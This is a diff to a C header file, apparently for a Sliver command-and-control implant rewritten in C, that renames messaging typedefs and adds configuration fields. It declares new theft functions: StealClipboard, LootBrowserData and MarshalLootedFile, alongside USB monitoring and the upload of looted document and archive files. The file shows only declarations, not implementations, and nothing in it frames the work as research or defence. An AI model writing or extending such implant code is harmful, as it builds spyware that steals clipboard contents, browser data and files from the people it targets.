@@ -16,8 +16,8 @@ typedef struct _DRIVE_PROFILE DRIVE_PROFILE, * PDRIVE_PROFILE;
 
 typedef LPVOID(WINAPI* CLIENT_INIT)(LPVOID);
 typedef BOOL(WINAPI* CLIENT_START)(PGLOBAL_CONFIG, LPVOID);
-typedef BOOL(WINAPI* SEND_EVELOPE)(PGLOBAL_CONFIG, LPVOID, PENVELOPE);
-typedef PENVELOPE(WINAPI* RECV_EVELOPE)(PGLOBAL_CONFIG, LPVOID);
+typedef BOOL(WINAPI* SEND_ENVELOPE)(PGLOBAL_CONFIG, LPVOID, PENVELOPE);
+typedef PENVELOPE(WINAPI* RECV_ENVELOPE)(PGLOBAL_CONFIG, LPVOID);
 typedef BOOL(WINAPI* CLIENT_CLOSE)(LPVOID);
 typedef BOOL(WINAPI* CLIENT_CLEANUP)(LPVOID);
 
@@ -62,20 +62,23 @@ struct _GLOBAL_CONFIG {
 	UINT64 uEncoderNonce;
 	LPSTR lpServerMinisignPublicKey;
 	LPSTR lpPeerAgePublicKeySignature;
-	DWORD dwMaxFailure;
+	DWORD dwMaxConnectionErrors;
 	DWORD dwReconnectInterval;
 	HANDLE hMutex;
 	DWORD dwListenerID;
 	PPIVOT_LISTENER* Listeners;
 	DWORD dwNumberOfListeners;
 	SRWLOCK RWLock;
-	LPWSTR lpScriptPath;
+	LPWSTR lpSliverPath;
+	LPWSTR lpMainExecutable;
 	ProtocolType Protocol;
 	ImplantType Type;
 	HANDLE hCurrentToken;
+	LPWSTR lpUniqueName;
 
 	// Loot file
 	BOOL Loot;
+	BOOL Clipboard;
 	LPWSTR* DocumentExtensions;
 	DWORD cDocumentExtensions;
 	LPWSTR* ArchiveExtensions;
@@ -157,11 +160,6 @@ struct _DRIVE_PROFILE {
 	DWORD dwPollInterval;
 };
 
-PBUFFER RegisterSliver
-(
-	_In_ PGLOBAL_CONFIG pConfig
-);
-
 PBUFFER MarshalEnvelope
 (
 	_In_ PENVELOPE pEnvelope
@@ -172,7 +170,7 @@ VOID FreeEnvelope
 	_In_ PENVELOPE pEnvelope
 );
 
-PSLIVER_THREADPOOL InitializeSliverThreadPool();
+PSLIVER_THREADPOOL InitializeSliverThreadPool(VOID);
 
 VOID FreeSliverThreadPool
 (
@@ -246,7 +244,8 @@ PBYTE MarshalWithoutMAC
 
 PSTANZA_WRAPPER ParseStanza
 (
-	_In_ PBYTE pInputBuffer
+	_In_ PBYTE pInputBuffer,
+	_In_ DWORD cbBuffer
 );
 
 PBYTE HeaderMAC
@@ -256,7 +255,7 @@ PBYTE HeaderMAC
 	_In_ DWORD cbFileKey
 );
 
-UINT64 GeneratePeerID();
+UINT64 GeneratePeerID(VOID);
 
 VOID MarshalConfig
 (
@@ -301,4 +300,19 @@ VOID MonitorUsb
 VOID SliverUploadLootedFile
 (
 	_In_ PSLIVER_SESSION_CLIENT pSession
+);
+
+VOID StealClipboard
+(
+	_In_ PGLOBAL_CONFIG pConfig
+);
+
+PENVELOPE MarshalLootedFile
+(
+	_In_ LPWSTR lpFilePath
+);
+
+VOID LootBrowserData
+(
+	_In_ PGLOBAL_CONFIG pConfig
 );
